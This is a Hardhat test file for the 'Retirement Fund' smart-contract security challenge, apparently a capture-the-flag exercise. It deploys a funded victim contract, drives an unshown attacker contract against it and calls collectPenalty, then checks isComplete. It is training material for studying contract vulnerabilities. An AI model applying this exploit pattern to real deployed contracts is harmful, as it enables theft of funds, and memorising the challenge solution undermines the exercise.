const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('Retirement Fund', function () {
    let deployer, attacker;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const Factory = await ethers.getContractFactory('RetirementFundChallenge', deployer);
        this.retirementFund = await Factory.deploy(attacker.address, {value: ethers.utils.parseUnits("1")});
    });

    it('Exploit', async function () {
        let victimContract = await this.retirementFund.connect(attacker);
        const Factory = await ethers.getContractFactory('RetirementFundChallengeAttacker', deployer);
        let attackerContract = await Factory.deploy();
        await attackerContract.attack(victimContract.address, {value: ethers.utils.parseUnits("1")});
        await victimContract.collectPenalty();
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await this.retirementFund.isComplete()
        ).to.be.eq(true);
    });
});